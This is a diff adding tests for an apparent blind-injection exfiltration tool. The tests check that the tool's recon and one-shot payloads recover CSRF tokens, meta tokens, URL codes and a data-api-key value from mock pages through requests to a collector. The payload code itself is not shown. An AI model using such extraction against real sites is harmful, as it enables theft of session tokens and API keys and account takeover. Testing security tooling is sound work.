@@ -290,6 +290,157 @@ test('blind: non-hex charsets are detected by recon and extracted over HTTP', as
   assert.equal(bad.status, 400, 'unknown charsets are rejected');
 });
 
+test('blind: one injection discovers and extracts different field kinds', async () => {
+  await getJson('/api/blind/reset');
+  const cfg = { targets: B.TARGETS, urlKinds: ['a', 'form'],
+    dataNames: B.ONE_SHOT_DATA_NAMES, urlCharset: 'hex', urlWindow: 4 };
+  const response = await postJson('/api/blind/one-shot', cfg);
+  assert.equal(response.status, 200);
+  const { fields } = await response.json();
+  const secret = {
+    input: 'Ab3dEfGh9JkLmN0pQrStUvWxYz12345678',
+    meta: 'Ab3d+fG/9JkL=N0pQrSt+vWx/z1234567=',
+    a: '0123456789abcdefabcdcafe',
+    form: 'fedcba9876543210abcdefff',
+    data: 'Ab3d-fG_9JkL-N0pQrSt_vWx-z12345678',
+  };
+  const form = el('form', { action: `/login?state=${secret.form}` });
+  const doc = page([
+    form,
+    el('input', { type: 'hidden', name: 'csrf_token', value: secret.input }, { form }),
+    el('meta', { name: 'csrf-token', content: secret.meta }),
+    el('a', { href: `/verify?code=${secret.a}&next=home` }),
+    el('span', { 'data-api-key': secret.data }),
+  ]);
+  const paths = requests(doc, B.oneShotPayload(fields, cfg));
+  assert.deepEqual(B.fieldsFromRecon(new Set([...paths].filter(p => p.startsWith('r/')).map(p => p.slice(2))))
+    .fields.map(f => f.name), ['csrf_token', 'csrf-token', 'code', 'state', 'data-api-key']);
+  for (const p of paths) await hit(p);
+  assert.equal((await getJson('/api/blind/tokens')).status, 'partial');
+  await sleep(SETTLE_MS + 50);
+  const results = (await getJson('/api/blind/tokens')).results;
+  assert.equal(results.length, 5);
+  for (const result of results.filter(r => Object.hasOwn(secret, r.kind))) {
+    assert.equal(result.status, 'ok', JSON.stringify(result));
+    assert.ok(listed(result, secret[result.kind]), JSON.stringify(result));
+  }
+});
+
+test('blind: one-shot rejects unknown attribute names and impossible options', async () => {
+  const cfg = { targets: ['data'], dataNames: ['data-api-key'], urlCharset: 'hex', urlWindow: 4 };
+  for (const bad of [
+    { ...cfg, dataNames: ['data-unknown'] },
+    { ...cfg, targets: ['input', 'input'] },
+    { ...cfg, dataNames: [] },
+    { ...cfg, inputNames: ['not-in-wordlist'] },
+    { ...cfg, urlKinds: ['script'] },
+    { ...cfg, urlCharset: 'unknown' },
+  ]) assert.equal((await postJson('/api/blind/one-shot', bad)).status, 400);
+});
+
+test('blind: empty input names do not hide a populated hidden token', async () => {
+  await getJson('/api/blind/reset');
+  const cfg = { targets: ['input'], inputNames: ['authenticity_token', 'code'],
+    dataNames: [], urlCharset: 'hex', urlWindow: 4 };
+  const { fields } = await (await postJson('/api/blind/one-shot', cfg)).json();
+  const secret = 'Ab3dEfGh9JkLmN0pQrStUvWxYz12345678';
+  const doc = page([
+    el('input', { type: 'hidden', name: 'authenticity_token', value: secret }),
+    el('input', { type: 'text', name: 'code', value: '' }),
+  ]);
+  for (const path of requests(doc, B.oneShotPayload(fields, cfg))) await hit(path);
+  await sleep(SETTLE_MS + 50);
+  const result = (await getJson('/api/blind/tokens')).results[0];
+  assert.equal(result.name, 'authenticity_token');
+  assert.equal(result.status, 'ok');
+  assert.ok(listed(result, secret));
+});
+
+test('blind: text inputs with a hidden input name cannot change its detected charset', async () => {
+  await getJson('/api/blind/reset');
+  const cfg = { targets: ['input'], inputNames: ['csrf'],
+    dataNames: [], urlCharset: 'hex', urlWindow: 4 };
+  const { fields } = await (await postJson('/api/blind/one-shot', cfg)).json();
+  const secret = 'Ab3d+fG/9JkL=N0pQrSt+vWx/z1234567=';
+  const doc = page([
+    el('input', { type: 'hidden', name: 'csrf', value: secret }),
+    el('input', { type: 'text', name: 'csrf', value: 'ordinarytext' }),
+  ]);
+  for (const path of requests(doc, B.oneShotPayload(fields, cfg))) await hit(path);
+  await sleep(SETTLE_MS + 50);
+  const result = (await getJson('/api/blind/tokens')).results[0];
+  assert.equal(result.status, 'ok');
+  assert.ok(listed(result, secret), JSON.stringify(result));
+});
+
+test('blind: one-shot keeps early fields when a later lane crosses the settle gap', async () => {
+  await getJson('/api/blind/reset');
+  const cfg = { targets: ['input', 'meta'], dataNames: [], urlCharset: 'hex', urlWindow: 4 };
+  const { fields } = await (await postJson('/api/blind/one-shot', cfg)).json();
+  const input = 'Ab3dEfGh9JkLmN0pQrStUvWxYz12345678';
+  const meta = 'Ab3d+fG/9JkL=N0pQrSt+vWx/z1234567=';
+  const doc = page([
+    el('input', { type: 'hidden', name: 'csrf', value: input }),
+    el('meta', { name: 'csrf-token', content: meta }),
+  ]);
+  const paths = requests(doc, B.oneShotPayload(fields, cfg));
+  for (const path of paths) if (path.startsWith('r/m') || path.startsWith(`b/${fields[1].id}/`)) await hit(path);
+  await sleep(SETTLE_MS + 50);
+  assert.equal((await getJson('/api/blind/tokens')).results[1].status, 'ok');
+  for (const path of paths) if (path.startsWith('r/i') || path.startsWith(`b/${fields[0].id}/`)) await hit(path);
+  await sleep(SETTLE_MS + 50);
+  const results = (await getJson('/api/blind/tokens')).results;
+  assert.ok(listed(results[0], input), JSON.stringify(results[0]));
+  assert.ok(listed(results[1], meta), JSON.stringify(results[1]));
+});
+
+test('blind: switching from one-shot to recon mode restores the multi-step flow', async () => {
+  // One-shot first: the server keeps hits across gaps in this mode.
+  await getJson('/api/blind/reset');
+  const cfg = { targets: ['input'], dataNames: [], urlCharset: 'hex', urlWindow: 4 };
+  assert.equal((await postJson('/api/blind/one-shot', cfg)).status, 200);
+  const stale = page([el('input', { type: 'hidden', name: 'nonce', value: 'deadbeefcafe' })]);
+  for (const p of requests(stale, B.reconPayload())) await hit(p);
+
+  // Copying the recon payload in the UI resets first, which leaves one-shot.
+  await getJson('/api/blind/reset');
+  const secret = 'Ab3d+fG/9JkL=N0pQrSt+vWx/z1234567=';
+  const form = el('form', {});
+  const doc = page([form, el('input', { type: 'hidden', name: 'csrf', value: secret }, { form })]);
+  for (const p of requests(doc, B.reconPayload())) await hit(p);
+  await sleep(SETTLE_MS + 50);
+  const found = await getJson('/api/recon');
+  assert.deepEqual(found.fields, [{ kind: 'input', name: 'csrf', host: 'form', charset: 'base64' }],
+    'only the new recon, nothing kept from the one-shot burst');
+  // Recon hits reset after a quiet gap again, as in the multi-step flow.
+  await sleep(SETTLE_MS + 50);
+  for (const p of requests(stale, B.reconPayload())) await hit(p);
+  await sleep(SETTLE_MS + 50);
+  assert.deepEqual((await getJson('/api/recon')).fields.map(f => f.name), ['nonce']);
+
+  const { fields } = await (await postJson('/api/blind', { fields: found.fields })).json();
+  for (const p of requests(doc, B.extractPayload(fields))) await hit(p);
+  await sleep(SETTLE_MS + 50);
+  const [result] = (await getJson('/api/blind/tokens')).results;
+  assert.equal(result.name, 'csrf');
+  assert.ok(listed(result, secret), JSON.stringify(result));
+});
+
+test('blind: one-shot reports mixed field names rather than misattributing a token', async () => {
+  await getJson('/api/blind/reset');
+  const cfg = { targets: ['input'], dataNames: [], urlCharset: 'hex', urlWindow: 4 };
+  const { fields } = await (await postJson('/api/blind/one-shot', cfg)).json();
+  const form = el('form');
+  const doc = page([form,
+    el('input', { type: 'hidden', name: 'csrf', value: 'abcdef1234567890' }, { form }),
+    el('input', { type: 'hidden', name: 'nonce', value: '1234567890abcdef' }, { form }),
+  ]);
+  for (const p of requests(doc, B.oneShotPayload(fields, cfg))) await hit(p);
+  await sleep(SETTLE_MS + 50);
+  assert.deepEqual((await getJson('/api/blind/tokens')).results[0].names, ['csrf', 'nonce']);
+  assert.equal((await getJson('/api/blind/tokens')).results[0].status, 'ambiguous_field');
+});
+
 test('blind: each configuration gets fresh field ids, so payload URLs never repeat', async () => {
   const configure = async () => (await (await postJson('/api/blind', {
     fields: [{ kind: 'meta', name: 'csrf-token', host: 'self', windowSize: 3 }],
